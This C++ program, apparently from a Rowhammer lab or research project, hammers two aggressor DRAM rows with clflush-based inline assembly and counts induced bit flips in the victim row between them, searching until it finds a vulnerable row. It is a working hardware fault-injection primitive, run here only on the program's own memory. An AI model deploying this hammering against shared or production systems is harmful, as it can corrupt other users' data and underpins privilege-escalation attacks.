#include "../shared.hh"
#include "../params.hh"
#include "../util.hh"
#include <unistd.h>
#include <set>

uint32_t hammer(uint64_t vict_virt_addr, uint64_t attacker_virt_addr_1, uint64_t attacker_virt_addr_2) {
    // prime
    uint8_t *vict_virt_addr_ptr = reinterpret_cast<uint8_t *>(vict_virt_addr);
    uint8_t *attacker_virt_addr_1_ptr = reinterpret_cast<uint8_t *>(attacker_virt_addr_1);
    uint8_t *attacker_virt_addr_2_ptr = reinterpret_cast<uint8_t *>(attacker_virt_addr_2);
    memset(vict_virt_addr_ptr, 0x55, ROW_SIZE);
    memset(attacker_virt_addr_1_ptr, 0xAA, ROW_SIZE);
    memset(attacker_virt_addr_2_ptr, 0xAA, ROW_SIZE);
    
    flush_row(vict_virt_addr_ptr);
    flush_row(attacker_virt_addr_1_ptr);
    flush_row(attacker_virt_addr_2_ptr);
  
    int num_reads = HAMMERS_PER_ITER;

    while (num_reads-- > 0 ) {
        asm volatile(
            "mov (%0), %%rax\n\t"
            "mov (%1), %%rax\n\t"
            "clflush (%0)\n\t"
            "clflush (%1)\n\t"
            "mfence\n\t"
            :
            : "r" (attacker_virt_addr_1), "r" (attacker_virt_addr_2)
            : "rax"
        );
    }

    flush_row(vict_virt_addr_ptr);
    uint32_t number_of_bitflips_in_target = count_flips(vict_virt_addr_ptr, 0x55);
    if (VERBOSE > 0) {
        print_result(vict_virt_addr, attacker_virt_addr_1, attacker_virt_addr_2, number_of_bitflips_in_target);
    }
    if (VERBOSE > 1 && number_of_bitflips_in_target) {
        print_diff(vict_virt_addr_ptr, 0x55);
    }
    return number_of_bitflips_in_target; 
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    uint64_t mem_size = 1.8 * BUFFER_SIZE;
    allocated_mem = allocate_pages(mem_size);
    setup_PPN_VPN_map(allocated_mem, mem_size);

    uint64_t victim; 
    uint64_t* attacker_1 = (uint64_t*) calloc(1, sizeof(uint64_t));
    uint64_t* attacker_2 = (uint64_t*) calloc(1, sizeof(uint64_t)); 
    uint32_t num_bit_flips;
    while (true) {
        victim = (uint64_t)((uint8_t *)allocated_mem + ROW_SIZE * (rand() % (mem_size / PAGE_SIZE)));

        // row + 1, row - 1
        if (get_addresses_to_hammer(virt_to_phys(victim), attacker_1, attacker_2, 1)) {
            num_bit_flips = hammer(victim, *attacker_1, *attacker_2);
            if (num_bit_flips > 0) break;
        }
    }
    printf("Found vulnerable row at %ld (virt) with bitflips %d\n", victim, num_bit_flips);
    num_bit_flips = hammer(victim, *attacker_1, *attacker_2);
    if (num_bit_flips > 0) {
        printf("Verified vulnerable row at %ld (virt) with bitflips %d\n", victim, num_bit_flips);
    } else {
        printf("Could not verify vulnerable row at %ld (virt) with bitflips %d\n", victim, num_bit_flips);
    }
    deallocate_pages(allocated_mem, mem_size);
    free(attacker_1);
    free(attacker_2);
}

